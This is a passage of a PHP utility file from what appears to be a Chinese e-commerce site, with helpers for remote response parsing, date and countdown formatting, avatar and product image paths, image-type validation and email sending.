	$response=@dfopen($server_url,5000000,$data);
	$error_msg=array(1=>"error_nodata",2=>"error_format",);
	if($response == "") {
		$result = $error_msg[($error = 1)];
	}else{
		$int = preg_match("/<DATA>(.*)<\/DATA>/s", $response, $m);
		if($int < 1){
			$result = $error_msg[($error = 2)];
		}else{
						if(false!==strpos($m[1],"\n")) {
				$m[1] = preg_replace('~\s+\w{1,10}\s+~','',$m[1]);
			}
			$response = unserialize(base64_decode($m[1]));
			$result = $response['data'];
			if($response['type']) {
				$error = 3;
			}
		}
	}
	return $result;
}

function face_get($uid,$type='small') {
	$type = 'small' == $type ? 's' : 'b';
	$file = IMAGE_PATH . 'face/' . face_path($uid) . $uid . "_{$type}.jpg";
	if(!is_file($file)) $file = IMAGE_PATH . 'no.gif';
	
	return $file;
}


function my_date_format2($time,$format='m月d日 H时i分') {
	$now = time();
			
	$t = $now - $time;
	if ($t < 60) {
		$time = __("刚刚");
	} elseif ($t < 3600) {
		$time = floor($t / 60) . __("分钟前");
	} elseif ($t < 86400) {			
		$time = floor($t / 3600) . "小时" . (($i=round($t % 3600 / 60)) > 0 ? "{$i}分钟" : "") . "前";
	} else {
		$time = my_date_format($time,$format);
	}
	
	return $time;
}

function timef($timeline, $type='')
{
	if ($type == '')
	{
		return date('Y-m-d H:i:s', $timeline);
	}
	if ($type == 's')
	{
		return date('Y-m-d', $timeline);
	}
}

function DateDiff($date1, $date2, $unit = '')
{
	switch ($unit)
	{
		case 's':
			$dividend = 1;
		break;
		case 'i':
			$dividend = 60;
		break;
		case 'h':
			$dividend = 3600;
		break;
		case 'd':
			$dividend = 86400;
		break;
		default:
			$dividend = 86400;
	}
	$time1 = strtotime($date1);
	$time2 = strtotime($date2);
	if ($time1 && $time2)
		return (float)($time1 - $time2) / $dividend;
	return false;
}

function DateLess($sec, $deep=9)
{
	$return = '剩余 ';
	if ($sec>86400)
	{
		$return .= (string)intval($sec/86400).' 天 ';
		$sec = $sec % 86400;
		if (--$deep<=0) return $return;
	}
	if ($sec>3600)
	{
		$return .= (string)intval($sec/3600).' 小时 ';
		$sec = $sec % 3600;
		if (--$deep<=0) return $return;
	}
	if ($sec>60)
	{
		$return .= (string)intval($sec/60).' 分 ';
		$sec = $sec % 60;
		if (--$deep<=0) return $return;
	}
	if ($sec>1)
	{
		$return .= (string)$sec.' 秒 ';
		if (--$deep<=0) return $return;
	}
	if ($sec<=0)
	{
		$return = __('已结束');
	}
	return $return;
}

function sendmail($uname,$emailaddress,$title,$content,$set){
	require("./setting/product.php");
	if($config['product']['default_mailtype']==1){
		stmp_mail($uname,$emailaddress,$title,$content,$set);
	}else{
		mail_mail($uname,$emailaddress,$title,$content,$set);
	};
}

function unescape($str) { 
		 $str = rawurldecode($str); 
		 preg_match_all("/%u.{4}|&#x.{4};|&#d+;|.+/U",$str,$r); 
		 $ar = $r[0]; 
		 foreach($ar as $k=>$v) { 
				  if(substr($v,0,2) == "%u") 
						   $ar[$k] = iconv("UCS-2","GBK",pack("H4",substr($v,-4))); 
				  elseif(substr($v,0,3) == "&#x") 
						   $ar[$k] = iconv("UCS-2","GBK",pack("H4",substr($v,3,-1))); 
				  elseif(substr($v,0,2) == "&#") { 
						   $ar[$k] = iconv("UCS-2","GBK",pack("n",substr($v,2,-1))); 
				  } 
		 } 
		 return join("",$ar); 
} 

function stmp_mail($uname,$emailaddress,$title,$content,$set)
{
	Load::lib('mail');
	$smtp_config = array (
	  'enable' => '1',
	  'host' => $set['default_server'],
	  'port' => $set['default_port'],
	  'mail' => $set['default_mail_from'],
	  'username' => $set['default_user'],
	  'password' => $set['default_pwd']
	);
	send_mail($emailaddress,$title,$content,$set['default_mail_user'],$set['default_mail_from'],array(),3,true,$smtp_config); 
}

function mail_mail($uname,$emailaddress,$title,$content,$set){
	require("./setting/settings.php");
	$headers = "MIME-Version: 1.0" . "\r\n";
	$headers .= "Content-type:text/html;charset=utf-8" . "\r\n";
		$headers .= 'From: '.$config['site_admin_email'] . "\r\n";	mail($emailaddress,$title,$content,$headers);
}

function dstripslashes($string) {
	if(is_array($string)) {
		foreach($string as $key => $val) {
			$string[$key] = dstripslashes($val);
		}
	} else {
		$string = stripslashes($string);
	}
	return $string;
}


function is_image($filename,$allow_types=array('gif'=>1,'jpg'=>1,'png'=>1,'bmp'=>1)) {
	if(!is_file($filename)) {
		return false;
	}
	
	$imagetypes = array('1'=>'gif','2'=>'jpg','3'=>'png','4'=>'swf','5'=>'psd','6'=>'bmp','7'=>'tiff','8'=>'tiff','9'=>'jpc','10'=>'jp2','11'=>'jpx','12'=>'jb2','13'=>'swc','14'=>'iff','15'=>'wbmp','16'=>'xbm',);
	if(!$allow_types) {
		$allow_types = array('gif'=>1,'jpg'=>1,'png'=>1,'bmp'=>1);
	}
	$typeid = 0;
	$imagetype = '';
	if(function_exists('exif_imagetype')) {
		$typeid = exif_imagetype($filename);
	} elseif (function_exists('getimagesize')) {
		$_tmps = getimagesize($filename);
		$typeid = (int) $_tmps[2];
	} else {
		if(($fh = @fopen($filename, "rb"))) {
			$strInfo = unpack("C2chars", fread($fh,2));
			fclose($fh);
			$fileTypes = array(7790=>'exe',7784=>'midi',8297=>'rar',255216=>'jpg',7173=>'gif',6677=>'bmp',13780=>'png',);
			$imagetype = $fileTypes[intval($strInfo['chars1'] . $strInfo['chars2'])];
		}
	}
	$file_ext = strtolower(trim(substr(strrchr($filename, '.'), 1)));
	if($typeid > 0) {
		$imagetype = $imagetypes[$typeid];		
	} else {
		if(!$imagetype) {
			$imagetype = $file_ext;
		}
	}
	
	if($allow_types && $file_ext && $imagetype && isset($allow_types[$file_ext]) && isset($allow_types[$imagetype])) {
		return true;
	}
	
	return false;
}

function imageurl($imgsrc, $type='')
{
	$img_urls = explode('|', $imgsrc);
	$file = $img_urls[0];
	$pre = '';
	if ($type == 's')
	{
		$pre = 's-';
	}
	return IMAGE_PATH.'product/'.$pre.$file;
}

?>